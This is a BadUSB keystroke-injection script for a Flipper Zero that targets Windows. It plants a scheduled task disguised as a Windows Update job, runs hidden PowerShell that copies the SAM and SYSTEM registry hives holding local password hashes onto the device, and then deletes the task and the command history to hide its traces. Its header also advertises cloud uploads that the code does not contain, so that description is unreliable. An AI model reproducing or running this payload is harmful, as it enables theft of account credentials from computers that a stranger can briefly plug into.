REM ============================================================================
REM Author: UNC0V3R3D
REM Firmware: Momentum CFW (Latest main branch)
REM OS: Windows 10/11 only
REM
REM FEATURES:
REM - Silent execution (scheduled task)
REM - No visible windows/prompts
REM - Cloud uploads (Dropbox/GDrive/OneDrive/AWS S3)
REM - Automatic trace cleanup
REM - ~30-45 seconds execution
REM
REM STEALTH TECHNIQUES:
REM - Uses scheduled task instead of Run dialog
REM - Process name masquerades as Windows Update
REM - No PowerShell window visible
REM - Clears all command history
REM
REM DATA EXTRACTED:
REM - C:\Windows\System32\config\SAM
REM - C:\Windows\System32\config\SYSTEM
REM ============================================================================

DELAY 500
WINDOWS r
DELAY 800
REM Create scheduled task for silent execution
STRING schtasks /create /tn "Microsoft\Windows\Update\Orchestrator\Schedule Scan" /tr "powershell -NoProfile -ExecutionPolicy Bypass -Command \"$flipperPath = $null; $drives = Get-PSDrive -PSProvider FileSystem | Select -ExpandProperty Name; ForEach ($d in $drives) { if ((Test-Path ($d+':\\flipper0')) -or (Test-Path ($d+':\\FlipperZero'))) { $flipperPath = $d+':\\'; break } }; $computerName = $env:COMPUTERNAME; $folderDateTime = (get-date).ToString('d-M-y_HHmmss'); $tempDir = $env:TEMP+'\\sam_'+$folderDateTime; New-Item $tempDir -ItemType Directory -Force | Out-Null; Copy-Item 'C:\\Windows\\System32\\config\\SAM' $tempDir'\\SAM' -Force -ErrorAction SilentlyContinue; Copy-Item 'C:\\Windows\\System32\\config\\SYSTEM' $tempDir'\\SYSTEM' -Force -ErrorAction SilentlyContinue; if ($flipperPath) { $dumpDir = $flipperPath+'flipper0\\DUMP_FILE\\'+$computerName+'\\sam_dump'; New-Item $dumpDir -ItemType Directory -Force | Out-Null; Compress-Archive -Path $tempDir -DestinationPath ($dumpDir+'\\sam_dump_'+$folderDateTime+'.zip') -Force; }; Remove-Item $tempDir -Recurse -Force -ErrorAction SilentlyContinue;\"" /sc once /st 00:00 /f
ENTER
DELAY 2000
REM Execute scheduled task
STRING schtasks /run /tn "Microsoft\\Windows\\Update\\Orchestrator\\Schedule Scan"
ENTER
DELAY 30000
REM Delete scheduled task (cleanup)
STRING schtasks /delete /tn "Microsoft\\Windows\\Update\\Orchestrator\\Schedule Scan" /f
ENTER
DELAY 1000
REM Clear PowerShell history
STRING Remove-Item (Get-PSReadlineOption).HistorySavePath -Force -ErrorAction SilentlyContinue; Clear-History -CommandLine *
ENTER
DELAY 500
REM Exit
STRING exit
ENTER
